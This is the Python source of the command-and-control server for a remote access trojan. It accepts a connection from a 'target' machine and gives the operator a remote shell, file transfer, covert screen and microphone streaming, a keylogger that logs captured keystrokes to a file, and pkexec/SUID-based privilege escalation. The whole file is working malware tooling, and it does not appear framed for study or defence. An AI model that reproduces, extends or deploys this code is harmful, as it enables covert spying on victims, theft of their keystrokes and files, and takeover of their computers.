#!/usr/bin/env python3
import socket
import json
import os
import threading
import cv2
import numpy as np
import struct
import pyaudio
import queue
import multiprocessing
import time

# =============================================================================
# Configuration
# =============================================================================
HOST_IP        = "0.0.0.0"
SHELL_PORT     = 5555
VIDEO_PORT     = 6666
AUDIO_PORT     = 7777
KEYLOGGER_PORT = 8888

# =============================================================================
# Enhanced Logging with Colors
# =============================================================================
class Style:
    RESET  = '\033[0m'
    RED    = '\033[31m'
    GREEN  = '\033[32m'
    YELLOW = '\033[33m'
    BLUE   = '\033[34m'
    CYAN   = '\033[36m'

class Log:
    def info(self, msg):    print(f"{Style.BLUE}[*]{Style.RESET} {msg}")
    def success(self, msg): print(f"{Style.GREEN}[+]{Style.RESET} {msg}")
    def warning(self,msg):  print(f"{Style.YELLOW}[!]{Style.RESET} {msg}")
    def error(self, msg):   print(f"{Style.RED}[-]{Style.RESET} {msg}")

log = Log()

# =============================================================================
# Main Server Class
# =============================================================================
class Server:
    def __init__(self, shell_port, video_port, audio_port, keylogger_port, host_ip="0.0.0.0"):
        self.host_ip             = host_ip
        self.shell_port          = shell_port
        self.video_port          = video_port
        self.audio_port          = audio_port
        self.keylogger_port      = keylogger_port
        self.target_socket       = None
        self.target_ip           = None
        self.screen_process      = None
        self.keylogger_thread    = None
        self.keylogger_stop_event= threading.Event()

        log.info("Server configured with ports:")
        print(f"  Shell     : {self.shell_port}")
        print(f"  Video     : {self.video_port}")
        print(f"  Audio     : {self.audio_port}")
        print(f"  Keylogger : {self.keylogger_port}")

    # -------------------------------------------------------------------------
    # JSON send/recv
    # -------------------------------------------------------------------------
    def _reliable_send(self, data):
        self.target_socket.send(json.dumps(data).encode())

    def _reliable_recv(self):
        buf = ''
        while True:
            try:
                buf += self.target_socket.recv(1024).decode()
                return json.loads(buf)
            except ValueError:
                continue
            except Exception as e:
                log.error(f"_reliable_recv error: {e}")
                return None

    # -------------------------------------------------------------------------
    # File upload/download
    # -------------------------------------------------------------------------
    def _upload_file(self, local_path):
        local_path = os.path.expanduser(local_path)
        if not os.path.exists(local_path):
            log.error(f"File not found: {local_path}")
            return

        try:
            with open(local_path, 'rb') as f:
                self.target_socket.sendall(f.read())
            log.success(f"Sent file: {local_path}")
        except Exception as e:
            log.error(f"Upload failed: {e}")


    def _download_file(self, remote_path):
        local_name = os.path.basename(remote_path)
        log.info(f"Downloading {remote_path} → {local_name}")
        self.target_socket.settimeout(2)
        try:
            first = self.target_socket.recv(1024)
            if first.startswith(b"ERROR:"):
                log.error(first.decode())
                return
            with open(local_name, 'wb') as f:
                f.write(first)
                while True:
                    try:
                        chunk = self.target_socket.recv(1024)
                        if not chunk:
                            break
                        f.write(chunk)
                    except socket.timeout:
                        break
            log.success(f"Downloaded {local_name}")
        except Exception as e:
            log.error(f"Download error: {e}")
        finally:
            self.target_socket.settimeout(None)

    # -------------------------------------------------------------------------
    # Privilege Escalation (no banners)
    # -------------------------------------------------------------------------
    def _privilege_escalator(self, user):
        print(f"Escalating privileges of USER:{user} with pkexec...")
        osname = self._reliable_recv()
        print(f"OS NAME: {osname}")
        if osname == 'posix':
            print('wait for SUID...')
            suid_msg = self._reliable_recv()
            print(f"Result from checking SUID: {suid_msg}")
            if "Found" in suid_msg:
                print("Starting Escalation")
                while True:
                    chk = self._reliable_recv()
                    print(chk)
                    if chk == "AUTHENTICATED":
                        break
                result = self._reliable_recv()
                print(result)
            else:
                print(self._reliable_recv())
        else:
            print("Escalation Failed B/C not posix system")

    # -------------------------------------------------------------------------
    # Interactive shell
    # -------------------------------------------------------------------------
    def _handle_shell(self):
        cwd = ''
        while True:
            cmd = input(f"Shell~{self.target_ip}: {cwd}$ ")
            self._reliable_send(cmd)

            if cmd.lower() == 'quit':
                self._stop_all_services()
                break
            if cmd.lower() == 'clear':
                os.system('cls' if os.name=='nt' else 'clear')
            elif cmd.startswith('cd '):
                resp = self._reliable_recv()
                if isinstance(resp, dict):
                    if resp.get('stderr'):
                        log.error(resp['stderr'])
                    else:
                        cwd = resp.get('stdout','') + ' '
                else:
                    print(resp)
            elif cmd.startswith('download '):
                self._download_file(cmd.split(' ',1)[1])
            elif cmd.startswith('upload '):
                self._upload_file(cmd.split(' ',1)[1])
            elif cmd.lower() == 'screen':
                self._start_screen_stream()
            elif cmd.lower() == 'keylogger':
                self._start_keylogger()
            elif cmd.startswith('escalate '):
                user = cmd.split(' ',1)[1]
                self._privilege_escalator(user)
            elif cmd.lower() == 'help':
                self._print_help()
            else:
                resp = self._reliable_recv()
                if isinstance(resp, dict):
                    if resp.get('stdout'):
                        print(f"{Style.GREEN}{resp['stdout']}{Style.RESET}")
                    if resp.get('stderr'):
                        print(f"{Style.RED}{resp['stderr']}{Style.RESET}")
                else:
                    print(resp)

    def _print_help(self):
        print("""
--- Commands ---
  quit           - end session
  clear          - clear screen
  cd <dir>       - change directory
  download <f>   - download file
  upload <f>     - upload file
  screen         - start video/audio stream
  keylogger      - start keylogger
  escalate <usr> - attempt privilege escalation
  help           - this menu
""")

    # -------------------------------------------------------------------------
    # Keylogger
    # -------------------------------------------------------------------------
    def _keylogger_receiver(self):
        try:
            with socket.socket() as ks:
                ks.bind((self.host_ip, self.keylogger_port))
                ks.listen(1)
                log.info(f"Keylogger on port {self.keylogger_port}")
                client, addr = ks.accept()
                log.success(f"Keylogger connected {addr}")
                with open("keylog.txt","a") as lf:
                    while not self.keylogger_stop_event.is_set():
                        client.settimeout(1.0)
                        try:
                            stroke = self._reliable_recv_from(client)
                            if stroke == "TERMINATE":
                                break
                            print(f"{Style.CYAN}{stroke}{Style.RESET}")
                            lf.write(stroke+"\n")
                        except socket.timeout:
                            continue
        except Exception as e:
            log.error(f"Keylogger error: {e}")
        finally:
            log.warning("Keylogger stopped")

    def _reliable_recv_from(self, sock):
        buf = ''
        while True:
            try:
                buf += sock.recv(1024).decode()
                return json.loads(buf)
            except ValueError:
                continue

    def _start_keylogger(self):
        if self.keylogger_thread and self.keylogger_thread.is_alive():
            log.warning("Keylogger already running")
            return
        self.keylogger_stop_event.clear()
        self.keylogger_thread = threading.Thread(target=self._keylogger_receiver, daemon=True)
        self.keylogger_thread.start()

    def _stop_keylogger(self):
        if self.keylogger_thread and self.keylogger_thread.is_alive():
            self.keylogger_stop_event.set()
            self.keylogger_thread.join(timeout=2)
            log.success("Keylogger stopped")

    # -------------------------------------------------------------------------
    # Screen streaming
    # -------------------------------------------------------------------------
    def _start_screen_stream(self):
        if self.screen_process and self.screen_process.is_alive():
            log.warning("Screen stream already running")
            return
        comm = multiprocessing.Queue()
        self.screen_process = multiprocessing.Process(
            target=screen_streamer_process,
            args=(self.host_ip, self.video_port, self.audio_port, comm)
        )
        self.screen_process.start()
        try:
            status = comm.get(timeout=25)
        except queue.Empty:
            log.error("Stream status not received (timeout)")
            return
        log.success(status)

    def _stop_screen_stream(self):
        if self.screen_process and self.screen_process.is_alive():
            self.screen_process.terminate()
            self.screen_process.join(timeout=2)
            log.success("Screen stream stopped")

    def _stop_all_services(self):
        log.info("Shutting down services…")
        self._stop_screen_stream()
        self._stop_keylogger()

    # -------------------------------------------------------------------------
    # Run
    # -------------------------------------------------------------------------
    def run(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind((self.host_ip, self.shell_port))
            srv.listen(1)
            log.info(f"Listening on port {self.shell_port}")
            self.target_socket, addr = srv.accept()
            self.target_ip = f"{addr[0]}:{addr[1]}"
            log.success(f"Connected: {self.target_ip}")
            log.info("Type 'help' for commands")
            try:
                self._handle_shell()
            finally:
                self.target_socket.close()
                log.warning("Connection closed")

# =============================================================================
# Screen streamer helpers
# =============================================================================
def receive_all(sock, n):
    buf = b''
    while n:
        chunk = sock.recv(n)
        if not chunk: return None
        buf += chunk
        n -= len(chunk)
    return buf

def video_stream_worker(vsock, q, evt):
    client, addr = vsock.accept()
    log.info(f"Video from {addr}")
    evt.set()
    try:
        while True:
            hdr  = receive_all(client, struct.calcsize(">L"))
            if not hdr: break
            size = struct.unpack(">L", hdr)[0]
            data = receive_all(client, size)
            if not data: break
            frame = cv2.imdecode(np.frombuffer(data, dtype=np.uint8), cv2.IMREAD_COLOR)
            q.put(frame)
    finally:
        client.close()
        log.warning("Video disconnected")

def audio_stream_worker(asock, evt):
    client, addr = asock.accept()
    log.info(f"Audio from {addr}")
    evt.set()
    p = pyaudio.PyAudio()
    stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100,
                    output=True, frames_per_buffer=256)
    try:
        while True:
            hdr  = receive_all(client, struct.calcsize(">L"))
            if not hdr: break
            size = struct.unpack(">L", hdr)[0]
            data = receive_all(client, size)
            if not data: break
            stream.write(data)
    finally:
        client.close()
        stream.stop_stream()
        stream.close()
        p.terminate()
        log.warning("Audio disconnected")

def screen_streamer_process(host, vport, aport, status_q):
    with socket.socket() as vsock, socket.socket() as asock:
        vsock.bind((host, vport)); vsock.listen(1)
        asock.bind((host, aport)); asock.listen(1)
        q      = queue.Queue()
        v_evt  = threading.Event()
        a_evt  = threading.Event()

        threading.Thread(target=video_stream_worker,
                         args=(vsock, q, v_evt),
                         daemon=True).start()
        threading.Thread(target=audio_stream_worker,
                         args=(asock, a_evt),
                         daemon=True).start()

        v_evt.wait(5)
        a_evt.wait(5)
        if not (v_evt.is_set() and a_evt.is_set()):
            status_q.put("Stream failed: timeout")
            return

        status_q.put("Stream established, press 'q' to quit")
        cv2.namedWindow('Live Stream', cv2.WINDOW_NORMAL)
        try:
            while v_evt.is_set() or a_evt.is_set():
                if not q.empty():
                    frame = q.get()
                    cv2.imshow('Live Stream', frame)
                    if cv2.waitKey(1) & 0xFF == ord('q'):
                        break
                time.sleep(0.01)
        finally:
            cv2.destroyAllWindows()
            log.info("Stream window closed")

# =============================================================================
# Entry Point
# =============================================================================
if __name__ == "__main__":
    server = Server(SHELL_PORT, VIDEO_PORT, AUDIO_PORT, KEYLOGGER_PORT, HOST_IP)
    try:
        server.run()
    except KeyboardInterrupt:
        log.warning("Interrupted by user, shutting down…")
        server._stop_all_services()
    finally:
        log.info("Server shutdown complete.")
